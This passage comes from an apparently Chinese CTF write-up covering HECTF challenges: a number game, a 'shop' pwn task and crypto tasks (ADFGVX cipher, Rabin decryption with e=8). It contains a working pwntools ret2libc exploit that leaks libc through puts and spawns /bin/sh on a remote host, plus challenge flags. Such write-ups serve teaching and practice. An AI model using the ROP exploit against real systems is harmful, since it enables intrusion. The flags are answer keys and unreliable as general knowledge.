class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><span class="line">输入正确！恭喜来到病毒的世界，通过数字对战游戏战胜病毒即可消除它...</span><br><span class="line"></span><br><span class="line">================ 数字对战游戏 ===============</span><br><span class="line">1. a、b、c的取值范围是0-9，且选择不能重复</span><br><span class="line">2. 通过某种计算，每局最终的sum值大的一方获胜</span><br><span class="line">3. 先得3分者胜</span><br><span class="line">=============================================</span><br><span class="line"></span><br><span class="line">===== 第1局 =====</span><br><span class="line">请输入参数 a ：2</span><br><span class="line">请输入参数 b ：0</span><br><span class="line">请输入参数 c ：9</span><br><span class="line"></span><br><span class="line">------ 第1局结果 ------</span><br><span class="line">您的选择：a=2, b=0, c=9</span><br><span class="line">病毒选择：a=0, b=2, c=1</span><br><span class="line">结果：您获胜！</span><br><span class="line">当前比分：您 1 - 0 病毒</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">===== 第2局 =====</span><br><span class="line">请输入参数 a ：3</span><br><span class="line">请输入参数 b ：1</span><br><span class="line">请输入参数 c ：4</span><br><span class="line"></span><br><span class="line">------ 第2局结果 ------</span><br><span class="line">您的选择：a=3, b=1, c=4</span><br><span class="line">病毒选择：a=0, b=1, c=4</span><br><span class="line">结果：病毒获胜！</span><br><span class="line">当前比分：您 1 - 1 病毒</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">===== 第3局 =====</span><br><span class="line">请输入参数 a ：2</span><br><span class="line">请输入参数 b ：0</span><br><span class="line">请输入参数 c ：3</span><br><span class="line"></span><br><span class="line">------ 第3局结果 ------</span><br><span class="line">您的选择：a=2, b=0, c=3</span><br><span class="line">病毒选择：a=1, b=0, c=4</span><br><span class="line">结果：病毒获胜！</span><br><span class="line">当前比分：您 1 - 2 病毒</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">===== 第4局 =====</span><br><span class="line">请输入参数 a ：1</span><br><span class="line">请输入参数 b ：0</span><br><span class="line">请输入参数 c ：4</span><br><span class="line"></span><br><span class="line">------ 第4局结果 ------</span><br><span class="line">您的选择：a=1, b=0, c=4</span><br><span class="line">病毒选择：a=0, b=2, c=1</span><br><span class="line">结果：您获胜！</span><br><span class="line">当前比分：您 2 - 2 病毒</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">===== 第5局 =====</span><br><span class="line">请输入参数 a ：1</span><br><span class="line">请输入参数 b ：0</span><br><span class="line">请输入参数 c ：4</span><br><span class="line"></span><br><span class="line">------ 第5局结果 ------</span><br><span class="line">您的选择：a=1, b=0, c=4</span><br><span class="line">病毒选择：a=0, b=3, c=1</span><br><span class="line">结果：您获胜！</span><br><span class="line">当前比分：您 3 - 2 病毒</span><br><span class="line"></span><br><span class="line">===== 比赛结束！=====</span><br><span class="line"></span><br><span class="line">===== 所有对局详细记录 ====</span><br><span class="line"></span><br><span class="line">----- 第1局 -----</span><br><span class="line">您的选择：      a=2, b=0, c=9  |  sum值：63.09175</span><br><span class="line">病毒选择：      a=0, b=2, c=1  |  sum值：53.78512</span><br><span class="line">结果：您获胜</span><br><span class="line"></span><br><span class="line">----- 第2局 -----</span><br><span class="line">您的选择：      a=3, b=1, c=4  |  sum值：58.40205</span><br><span class="line">病毒选择：      a=0, b=1, c=4  |  sum值：62.10399</span><br><span class="line">结果：病毒获胜</span><br><span class="line"></span><br><span class="line">----- 第3局 -----</span><br><span class="line">您的选择：      a=2, b=0, c=3  |  sum值：65.67390</span><br><span class="line">病毒选择：      a=1, b=0, c=4  |  sum值：67.33289</span><br><span class="line">结果：病毒获胜</span><br><span class="line"></span><br><span class="line">----- 第4局 -----</span><br><span class="line">您的选择：      a=1, b=0, c=4  |  sum值：67.33289</span><br><span class="line">病毒选择：      a=0, b=2, c=1  |  sum值：53.78512</span><br><span class="line">结果：您获胜</span><br><span class="line"></span><br><span class="line">----- 第5局 -----</span><br><span class="line">您的选择：      a=1, b=0, c=4  |  sum值：67.33289</span><br><span class="line">病毒选择：      a=0, b=3, c=1  |  sum值：41.55686</span><br><span class="line">结果：您获胜</span><br><span class="line"></span><br><span class="line">===== 最终结果 =====</span><br><span class="line">恭喜您获胜！</span><br><span class="line">病毒悄悄溜走了，并留下了：HECTF&#123;6NhZkUrkgIZdve6dnzXiAEFVpDuVffUv&#125;</span><br></pre></td></tr></table></figure>
<h2 id="shop"><a class="markdownIt-Anchor" href="#shop">#</a> <strong>shop</strong></h2>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">__int64 <span class="title function_">record_purchase</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> v1[<span class="number">32</span>]; <span class="comment">// [rsp+0h] [rbp-50h] BYREF</span></span><br><span class="line">  <span class="type">char</span> s[<span class="number">32</span>]; <span class="comment">// [rsp+20h] [rbp-30h] BYREF</span></span><br><span class="line">  __int64 v3; <span class="comment">// [rsp+40h] [rbp-10h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Enter product name:&quot;</span>);</span><br><span class="line">  fgets(s, <span class="number">32</span>, <span class="built_in">stdin</span>);</span><br><span class="line">  s[<span class="built_in">strcspn</span>(s, <span class="string">&quot;\n&quot;</span>)] = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Enter product price:&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v3);</span><br><span class="line">  getchar();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Enter purchase description:&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> gets(v1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>​		这里存在栈溢出漏洞，checksec 一下看看没有保护，nx 都没开，不需要尝试泄露 elf_base，逆向到密码： <code>shopadmin123</code> ，这个函数里存在整数溢出漏洞：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">manage_inventory</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v1; <span class="comment">// [rsp+Ch] [rbp-4h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Enter total purchase amount:&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v1);</span><br><span class="line">  getchar();</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)check_amount(v1) )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Amount exceeds limit! Access denied.&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Amount verified. Proceeding to record...&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> record_purchase();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">_BOOL8 __fastcall <span class="title function_">check_amount</span><span class="params">(<span class="type">int</span> a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> a1 &gt;= <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>​		最后 exp：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc.so.6&quot;</span>)</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">io = remote(<span class="string">&quot;47.100.66.83&quot;</span>,<span class="number">30527</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">b&quot;Enter choice:&quot;</span>)</span><br><span class="line">io.sendline(<span class="string">b&quot;2&quot;</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&quot;Enter admin password:\n&quot;</span>)</span><br><span class="line">io.sendline(<span class="string">b&quot;shopadmin123&quot;</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&quot;Enter total purchase amount:\n&quot;</span>)</span><br><span class="line">io.sendline(<span class="string">b&quot;-1&quot;</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&quot;Enter product name:\n&quot;</span>)</span><br><span class="line">io.sendline(<span class="string">b&quot;aaaaa&quot;</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&quot;Enter product price:\n&quot;</span>)</span><br><span class="line">io.sendline(<span class="string">b&quot;1&quot;</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&quot;Enter purchase description:\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">pop_edi_ret = <span class="number">0x0000000000401240</span></span><br><span class="line">ret = <span class="number">0x000000000040101a</span></span><br><span class="line">puts_plt = elf.plt[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line">record_purchase = elf.symbols[<span class="string">&quot;main&quot;</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&quot;a&quot;</span>*<span class="number">0x58</span> + p64(ret) + p64(pop_edi_ret) + p64(puts_got) + p64(puts_plt)+ p64(ret) + p64(record_purchase)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">puts_real = u64(io.recvuntil(<span class="string">b&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(puts_real))</span><br><span class="line">libc_base = puts_real - libc.sym[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base))</span><br><span class="line">syst_addr = libc_base + libc.sym[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">binsh = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&quot;/bin/sh&quot;</span>))</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">b&quot;Enter choice:&quot;</span>)</span><br><span class="line">io.sendline(<span class="string">b&quot;2&quot;</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&quot;Enter admin password:\n&quot;</span>)</span><br><span class="line">io.sendline(<span class="string">b&quot;shopadmin123&quot;</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&quot;Enter total purchase amount:\n&quot;</span>)</span><br><span class="line">io.sendline(<span class="string">b&quot;-1&quot;</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&quot;Enter product name:\n&quot;</span>)</span><br><span class="line">io.sendline(<span class="string">b&quot;aaaaa&quot;</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&quot;Enter product price:\n&quot;</span>)</span><br><span class="line">io.sendline(<span class="string">b&quot;1&quot;</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&quot;Enter purchase description:\n&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&quot;a&quot;</span>*<span class="number">0x58</span> + p64(ret) + p64(pop_edi_ret) + p64(binsh) + p64(syst_addr)+ p64(ret) + p64(record_purchase)</span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
<h1 id="crypto"><a class="markdownIt-Anchor" href="#crypto">#</a> Crypto</h1>
<h2 id="下个棋吧"><a class="markdownIt-Anchor" href="#下个棋吧">#</a> <strong>下个棋吧</strong></h2>
<blockquote>
<p>先别做题了，flag 给你，过来陪我下把棋，对了，别忘了 flag 要大写，RERBVkFGR0RBWHtWR1ZHWEFYRFZHWEFYRFZWVkZWR1ZYVkdYQX0=</p>
</blockquote>
<p>​		base64 解密得到 <code>DDAVAFGDAX&#123;VGVGXAXDVGXAXDVVVFVGVXVGXA&#125;</code> ，根据下棋内容搜索到是棋盘密码，得到 flag <code>hectf&#123;1145145201314&#125;</code> ，棋盘类型是 ADFGVX。最后 flag 为： <code>HECTF&#123;1145145201314&#125;</code></p>
<h2 id="simple_math"><a class="markdownIt-Anchor" href="#simple_math">#</a> <strong>simple_math</strong></h2>
<blockquote>
<p>一道普通的数学题，我会做数学题，你会做数学题吗？</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getmodule</span>(<span class="params">bits</span>):</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        f = getPrime(bits)</span><br><span class="line">        g = getPrime(bits)</span><br><span class="line">        p = (f&lt;&lt;bits)+g</span><br><span class="line">        q = (g&lt;&lt;bits)+f</span><br><span class="line">        <span class="keyword">if</span> isPrime(p) <span class="keyword">and</span> isPrime(q):</span><br><span class="line">            <span class="keyword">assert</span>  p%<span class="number">4</span> == <span class="number">3</span> <span class="keyword">and</span> q%<span class="number">4</span> == <span class="number">3</span></span><br><span class="line">            n = p * q</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> n</span><br><span class="line"></span><br><span class="line">e = <span class="number">8</span></span><br><span class="line">n = getmodule(<span class="number">128</span>)</span><br><span class="line"></span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line">c = <span class="built_in">pow</span>(m,e,n)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;c =&#x27;</span>,c)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;n =&#x27;</span>,n)</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">c = 5573794528528829992069712881335829633592490157207670497446565713699227752853445149101948822818379411492395823975723302499892036773925698697672557700027422</span></span><br><span class="line"><span class="string">n = 6060692198787960152570793202726365711311067556697852613814176910700809041055277955552588176731629472381832554602777717596533323522044796564358407030079609</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>​		有 n，有 c，试着分解 n：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">n = <span class="number">6060692198787960152570793202726365711311067556697852613814176910700809041055277955552588176731629472381832554602777717596533323522044796564358407030079609</span></span><br><span class="line">K = <span class="number">2</span>**<span class="number">128</span></span><br><span class="line">L = n % K</span><br><span class="line">M_low = (n &gt;&gt; <span class="number">128</span>) % K</span><br><span class="line">M_high = (n &gt;&gt; <span class="number">256</span>) % K</span><br><span class="line">H = n &gt;&gt; <span class="number">384</span></span><br><span class="line"></span><br><span class="line">found = <span class="literal">False</span></span><br><span class="line"><span class="keyword">for</span> carry <span class="keyword">in</span> [<span class="number">0</span>, <span class="number">1</span>]:</span><br><span class="line">    A_hi = H - carry</span><br><span class="line">    <span class="keyword">if</span> A_hi &lt; <span class="number">0</span> <span class="keyword">or</span> A_hi &gt;= K:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    A = (A_hi &lt;&lt; <span class="number">128</span>) + L</span><br><span class="line">    Y = (carry &lt;&lt; <span class="number">256</span>) + (M_high &lt;&lt; <span class="number">128</span>) + M_low</span><br><span class="line">    B = Y - (L &lt;&lt; <span class="number">128</span>) - A_hi</span><br><span class="line">    <span class="keyword">if</span> B &lt;= <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    u_sq = B + <span class="number">2</span> * A</span><br><span class="line">    d_sq = B - <span class="number">2</span> * A</span><br><span class="line">    u, u_rem = gmpy2.iroot(u_sq, <span class="number">2</span>)</span><br><span class="line">    d, d_rem = gmpy2.iroot(d_sq, <span class="number">2</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> (u_rem <span class="keyword">and</span> d_rem):</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    u = <span class="built_in">int</span>(u)</span><br><span class="line">    d = <span class="built_in">int</span>(d)</span><br><span class="line">    f = (u + d) // <span class="number">2</span></span><br><span class="line">    g = (u - d) // <span class="number">2</span></span><br><span class="line">    <span class="keyword">if</span> isPrime(f) <span class="keyword">and</span> isPrime(g) <span class="keyword">and</span> f.bit_length() == <span class="number">128</span> <span class="keyword">and</span> g.bit_length() == <span class="number">128</span>:</span><br><span class="line">        p = (f &lt;&lt; <span class="number">128</span>) + g</span><br><span class="line">        q = (g &lt;&lt; <span class="number">128</span>) + f</span><br><span class="line">        <span class="keyword">if</span> p * q == n:</span><br><span class="line">            found = <span class="literal">True</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;p:&quot;</span>,p)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;q:&quot;</span>,q)</span><br><span class="line"></span><br><span class="line"><span class="comment">#p: 94775913392603172629814422762806227966393098973930911178857725348364686169243</span></span><br><span class="line"><span class="comment">#q: 63947599994968442166142762354632092599995017543858024932091322657529881751163</span></span><br></pre></td></tr></table></figure>
<p>​		有 p，q，n，c，e，但是 e 和 phi 不互素，rabin 进行三次二次开方，可以解：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"><span class="keyword">from</span> Cryptodome.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># 已知参数</span></span><br><span class="line">p = <span class="number">94775913392603172629814422762806227966393098973930911178857725348364686169243</span></span><br><span class="line">q = <span class="number">63947599994968442166142762354632092599995017543858024932091322657529881751163</span></span><br><span class="line">n = p * q</span><br><span class="line">c = <span class="number">5573794528528829992069712881335829633592490157207670497446565713699227752853445149101948822818379411492395823975723302499892036773925698697672557700027422</span></span><br><span class="line">e = <span class="number">8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rabin_sqrt</span>(<span class="params">x, p, q, n</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    单个值的Rabin二次开方（核心函数）：求解 y² ≡ x mod n</span></span><br><span class="line"><span class="string">    返回模n下的4个二次剩余解（Rabin解密的标准4个解）</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">if</span> x == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> [<span class="number">0</span>]</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 1. 分别在模p、模q下求解二次剩余（利用4k+3素数特性）</span></span><br><span class="line">    yp1 = <span class="built_in">pow</span>(x, (p + <span class="number">1</span>) // <span class="number">4</span>, p)</span><br><span class="line">    yp2 = p - yp1  <span class="comment"># 模p的两个解</span></span><br><span class="line">    yq1 = <span class="built_in">pow</span>(x, (q + <span class="number">1</span>) // <span class="number">4</span>, q)</span><br><span class="line">    yq2 = q - yq1  <span class="comment"># 模q的两个解</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 2. 预计算模逆（避免重复计算）</span></span><br><span class="line">    inv_p = gmpy2.invert(p, q)</span><br><span class="line">    inv_q = gmpy2.invert(q, p)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 3. 用中国剩余定理（CRT）合并4种解的组合，得到模n的4个解</span></span><br><span class="line">    <span class="comment"># 组合1：yp1 &amp; yq1</span></span><br><span class="line">    y1 = (inv_q * q * yp1 + inv_p * p * yq1) % n</span><br><span class="line">    <span class="comment"># 组合2：yp1 &amp; yq2</span></span><br><span class="line">    y2 = (inv_q * q * yp1 + inv_p * p * yq2) % n</span><br><span class="line">    <span class="comment"># 组合3：yp2 &amp; yq1</span></span><br><span class="line">    y3 = (inv_q * q * yp2 + inv_p * p * yq1) % n</span><br><span class="line">    <span class="comment"># 组合4：yp2 &amp; yq2</span></span><br><span class="line">    y4 = (inv_q * q * yp2 + inv_p * p * yq2) % n</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> [<span class="built_in">int</span>(y1), <span class="built_in">int</span>(y2), <span class="built_in">int</span>(y3), <span class="built_in">int</span>(y4)]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">solve_e8_with_rabin</span>(<span class="params">c, p, q, n</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    利用Rabin核心思想求解e=8的情况：m⁸ ≡ c mod n</span></span><br><span class="line"><span class="string">    步骤：连续3次二次开方（8=2³），逐步迭代候选解</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="comment"># 第1次开方：求解 x1² ≡ c mod n → x1 = m^4（初始候选解）</span></span><br><span class="line">    candidates_1 = rabin_sqrt(c, p, q, n)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;第1次开方（得到m^4的候选解）：共<span class="subst">&#123;<span class="built_in">len</span>(candidates_1)&#125;</span>个&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 第2次开方：对每个x1，求解 x2² ≡ x1 mod n → x2 = m^2</span></span><br><span class="line">    candidates_2 = <span class="built_in">set</span>()  <span class="comment"># 用集合去重</span></span><br><span class="line">    <span class="keyword">for</span> x1 <span class="keyword">in</span> candidates_1:</span><br><span class="line">        res = rabin_sqrt(x1, p, q, n)</span><br><span class="line">        candidates_2.update(res)</span><br><span class="line">    candidates_2 = <span class="built_in">list</span>(candidates_2)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;第2次开方（得到m^2的候选解）：共<span class="subst">&#123;<span class="built_in">len</span>(candidates_2)&#125;</span>个&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 第3次开方：对每个x2，求解 x3² ≡ x2 mod n → x3 = m（最终明文候选）</span></span><br><span class="line">    candidates_3 = <span class="built_in">set</span>()</span><br><span class="line">    <span class="keyword">for</span> x2 <span class="keyword">in</span> candidates_2:</span><br><span class="line">        res = rabin_sqrt(x2, p, q, n)</span><br><span class="line">        candidates_3.update(res)</span><br><span class="line">    